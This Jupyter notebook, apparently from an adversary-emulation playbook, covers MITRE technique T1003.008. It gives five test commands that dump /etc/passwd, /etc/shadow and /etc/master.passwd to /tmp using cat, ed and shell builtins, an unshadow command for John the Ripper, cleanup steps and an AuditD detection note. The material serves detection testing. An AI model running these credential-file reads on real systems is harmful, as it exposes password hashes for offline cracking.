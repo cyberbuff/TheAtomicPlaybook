{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "59786499",
   "metadata": {},
   "source": "# T1003.008 - /etc/passwd and /etc/shadow\nAdversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\n"
  },
  {
   "cell_type": "markdown",
   "id": "840a14c1",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "cb9e837d",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Access /etc/shadow (Local)",
    "/etc/shadow file is accessed in Linux environments\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsudo cat /etc/shadow > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a4b8df7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "c0112f0f",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b09d138",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b5216f85",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Access /etc/master.passwd (Local)",
    "/etc/master.passwd file is accessed in FreeBSD environments\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo cat /etc/master.passwd > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d98859d9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ffd48675",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1905c74",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2b47665b",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Access /etc/passwd (Local)",
    "/etc/passwd file is accessed in FreeBSD and Linux environments\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncat /etc/passwd > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8bd22899",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "da88eeaf",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eff94827",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5da4b560",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",
    "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nunamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; fi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3edb354",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "53e49d0b",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a37112e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c28ae45a",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Access /etc/{shadow,passwd,master.passwd} with shell builtins",
    "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntestcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }\n[ \"$(uname)\" = 'FreeBSD' ] && testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d95f4022",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "4dc24507",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "df423473",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fe5852e3",
   "metadata": {},
   "source": "## Detection\nThe AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}